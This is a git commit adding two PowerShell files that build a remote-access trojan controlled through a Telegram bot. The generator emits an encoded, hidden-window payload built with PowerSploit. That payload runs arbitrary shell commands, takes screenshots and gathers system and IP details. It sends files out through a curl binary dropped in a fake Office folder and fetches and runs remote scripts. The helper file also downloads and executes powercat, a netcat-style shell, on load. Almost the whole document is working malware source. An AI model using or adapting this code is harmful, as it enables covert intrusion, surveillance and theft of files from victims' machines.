99dea36d195cacfd20ccfef733d2a33dc83b8773
cybervaca <cybervaca@gmail.com>
2017-02-02 17:28:22 +0100

    Add files via upload

---
+++ Functions.ps1
@@ -0,0 +1,111 @@
+
+function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}
+
+function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; $file = [io.file]::ReadAllBytes($File) ; [io.file]::WriteAllBytes($output,$file) }
+
+function bot-send {
+
+param ($photo,$file,$botkey,$chat_id)
+
+$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
+$curl = $ruta + "\" + "curl.exe"
+$curl_mod = $ruta + "\" + "curl_mod.exe"
+if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
+if ( (Test-Path $curl) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://github.com/cybervaca/psbotelegram/raw/master/curl.exe","$curl")
+
+Disable-Smartscreen -File $curl -Output $curl_mod
+Remove-Item $curl
+}
+
+if ($file -ne $null) {
+$proceso = $curl_mod
+$uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
+$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '
+Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden}
+
+if ($photo -ne $null){
+
+$proceso = $curl_mod
+$uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
+$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '
+Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden
+
+
+}
+
+}
+
+function get-info {$OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME 
+$Bios = Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME 
+$sheetS = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME 
+$sheetPU = Get-WmiObject -Class Win32_Processor -ComputerName $env:COMPUTERNAME 
+$drives = Get-WmiObject -ComputerName $env:COMPUTERNAME Win32_LogicalDisk  | Where-Object {$_.DriveType -eq 3}
+$pingStatus = Get-WmiObject  -Query "Select * from win32_PingStatus where Address='$env:COMPUTERNAME'  "
+$IPAddress= (Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $env:COMPUTERNAME  | ? {$_.ipenabled}).ipaddress 
+$OSRunning = $OS.caption + " " + $OS.OSArchitecture + " SP " + $OS.ServicePackMajorVersion
+$NoOfProcessors=$sheetS.numberofProcessors
+$name=$SheetPU|select name -First 1
+$Manufacturer=$sheetS.Manufacturer
+$Model=$sheetS.Model
+
+$PC = New-Object psobject -Property @{ 
+"Nombre" = $env:COMPUTERNAME
+"Modelo Monitor" = $MonitorModelo
+"Monitor Num. Serie" = $MonitorSerial
+"Sistema Operativo" = $OSRunning
+"Procesador" = $name.name
+"Fabricante" = $Manufacturer
+"Modelo" = $Model
+"Num. Procesadores" = "$NoOfProcessors"
+"Memoria RAM" = "$ram_round Gb"
+"Direccion IP" = [string]$IPAddress[0]
+"MAC" = $mac
+"Numero de serie" = $serialnumer
+"Disco Duro" = $Disco_duro
+}
+
+$PC | select-Object Nombre, "Modelo Monitor", "Monitor Num. Serie", "Sistema Operativo", "Procesador", "Fabricante", "Modelo", "Num. Procesadores", "Memoria RAM", "Disco Duro", "Direccion IP", "MAC", "Numero de Serie" 
+}
+function public-ip {param ($botkey)
+$datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json  | ConvertFrom-Json
+ $resultado = New-Object psobject -Property @{"IP"= $datos_ip_publica.ip
+ "Pais" = $datos_ip_publica.country
+ "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pais, Ciudad}
+
+function bot-public {param($botkey) $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" ; $Obtenemos_datos_actualizados = (invoke-WebRequest -Uri $getUpdatesLink -Method post).content ; $Obtenemos_datos_actualizados = $Obtenemos_datos_actualizados -split "," ; $chat_id =  $Obtenemos_datos_actualizados | Select-String "chat"; $chat_id = $chat_id[0] -replace '"chat":{"id":' ; $chat_id_result = New-Object psobject -Property @{"chat_id"= $chat_id} ; $chat_id_result | Select-Object chat_id}
+
+$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat
+
+function screen-shot {param ($botkey,$chat)
+
+$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office\" + "screenshot.png"
+
+Add-Type -AssemblyName System.Windows.Forms
+$resolucion = [System.Windows.Forms.Screen]::AllScreens | Select-Object bounds
+$resolucion = $resolucion -split (",")
+$ancho = $resolucion[2] -replace "width="
+[string]$alto = $resolucion[3] -replace "height=" ; $alto =  $alto -replace ".$" ; $alto =  $alto -replace ".$"
+$ancho = [int]$ancho
+$alto = [int]$alto
+$horizontal = (Get-WmiObject -Class Win32_VideoController).CurrentHorizontalResolution
+$vertical = (Get-WmiObject -Class Win32_VideoController).CurrentVerticalResolution
+[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $ancho, $alto)
+
+function screenshot([Drawing.Rectangle]$bounds, $path) {
+   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+   $graphics = [Drawing.Graphics]::FromImage($bmp)
+
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+   $bmp.Save($path)
+
+   $graphics.Dispose()
+   $bmp.Dispose()
+ }
+
+ screenshot $bounds $ruta
+
+bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
+
+}
---
+++ PSBoTelegram.ps1
@@ -0,0 +1,75 @@
+clear
+$ErrorActionPreference = "SilentlyContinue"
+$version = "0.2"
+
+$banner = "    ____  _____ ____      ______     __                              
+   / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
+  / /_/ /\__ \/ __  / __ \/ / / _ \/ / _ \/ __  / ___/ __  / __  __ \
+ / ____/___/ / /_/ / /_/ / / /  __/ /  __/ /_/ / /  / /_/ / / / / / /
+/_/    /____/_____/\____/_/  \___/_/\___/\__, /_/   \__,_/_/ /_/ /_/ 
+                                        /____/                       "
+
+
+
+
+
+Write-Host $banner -ForegroundColor Green ; Write-Host "`n                                                     v$version by CyberVaca @ Luis Vacas" -ForegroundColor red
+
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el delay para la conexión: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
+
+Function check-command
+{
+ Param ($command)
+ $antigua_config = $ErrorActionPreference
+ $ErrorActionPreference = "stop"
+ try {if(Get-Command $command){RETURN $true}}
+ Catch { RETURN $false}
+ Finally {$ErrorActionPreference=$antigua_config}
+ }
+if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
+IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
+$scriptblock = {
+param (
+[string]$botkey = "your_token",
+[string]$bot_Master_ID = "your_chat_id",
+[int]$delay = "your_delay"
+)
+IEX (Invoke-WebRequest "https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Functions.ps1").content
+$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ; $bot = [string]$bot[3] ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" 
+[int]$first_connect = "1"
+$help = "PSBoTelegram V0.2`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot"
+while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
+    $l = $json.result.length
+	$i = 0
+if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
+	while ($i -lt $l) {
+		$offset = $json.result[$i].update_id + 1
+        $comando = $json.result[$i].message.text
+Write-Host "$comando"
+
+ if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+ if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
+ if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Download") {$file = $comando -replace "/Download " ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
+ if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
+
+   		$i++
+	}
+
+if ($kill -eq "$true" -and $first_connect -gt 5) {break}
+	Start-Sleep -s $delay ;$first_connect++ 
+}
+}
+$scriptblock | Out-File bot.ps1
+$scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay" | Out-File bot.ps1
+Out-EncodedCommand -Path bot.ps1 -NoProfile -NonInteractive -WindowStyle Hidden -EncodedOutput ; Remove-Item bot.ps1
